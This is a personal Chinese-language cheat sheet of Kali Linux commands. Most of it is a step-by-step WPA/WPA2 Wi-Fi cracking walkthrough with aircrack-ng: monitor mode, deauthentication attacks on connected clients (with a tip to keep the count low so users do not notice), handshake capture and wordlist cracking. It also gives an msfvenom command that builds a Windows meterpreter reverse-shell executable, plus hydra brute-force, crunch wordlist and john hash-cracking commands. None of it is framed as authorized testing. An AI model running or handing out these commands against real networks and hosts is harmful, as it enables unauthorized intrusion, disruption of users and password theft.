# Kali Linux Tools

## Aircrack-ng

https://www.itread01.com/content/1543852627.html

* ifconfig 確認是否有 `wlan0`

* 啟用網卡監聽模式
    * `airmon-ng start wlan0`

* 查看現在網卡抓到的AP
    * `airodump-ng wlan0mon`

* 找一台喜歡的，記下BSSID以及channel，開始收集封包
    !> **Important** 建議data收集到破萬，才有夠多參考價值
    * `airodump-ng -w <path> -c <channel> --bssid <bssid> wlan0mon`

* 開啟另一個console，不要打斷它收集封包，同時收集到我們想要的資訊，(網路上叫他握手包)(4-way handshake)
    * 原理是，給連接到wifi的一個設備發送一個`deauth（反認證）`包，讓那個設備斷開wifi，隨後它自然會再次連接wifi
    * `-0` 的攻擊模式是發送阻斷訊號，讓使用者誤以為與 AP 連線中斷而重新發出授權請求，由 airodump-ng 進而擷取需要的 arp 封包 （參數 10 代表攻擊10次，請斟酌數量，大量攻擊會讓使用者查覺到網路異常)
    * `-a` 為要攻擊的 AP mac
    * `aireplay-ng -0 10 -a AE:37:43:C8:2F:FB wlan0mon`

* 同時確認收集封包的console，有沒有握手包
    * ![](https://i.imgur.com/fLO8CRa.png)


* 封包收集完後，可以把監聽模式關掉
    * `airmon-ng stop wlan0mon`

* 封包收集完後開始破解
    * `aircrack-ng -a2 -b AE:37:43:C8:2F:FB -w /usr/share/wordlists/rockyou.txt ~/*.cap`

* 成功圖如下
   * ![](https://i.imgur.com/gl2qnZt.png)


* 參考自
    * https://shazi.info/%E4%BD%BF%E7%94%A8-aircrack-ng-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-wpawpa2-%E5%8A%A0%E5%AF%86-wifi-%E5%AF%86%E7%A2%BC/
    * http://topspeedsnail.com/kali-linux-crack-wifi-wpa/


---

## Metasploit


### Search Exploit

```bash
searchsploit <keyword>
```

### practice
- `ctfthemes.appspot.com`

### windows reverse shell製作

```bash=
msfvenom -p windows/meterpreter/reverse_tcp lhost=<host> lport=<port> -f exe -o /tmp/my_payload.exe
```

## Password

### 生密碼包

#### Crunch
* `crunch 7 8 123abc,./ -o ps.txt `

### 破密

#### hydra

```
hydra -L user.txt -P pass.txt <ip> <protocol>
```

#### john

* 簡單模式
```
john --format=<hashmode> <file>
//sha512crypt
john -show <file>
```

* File
```
john --wordlist=<密碼檔> <file> --format=<hashmode>
```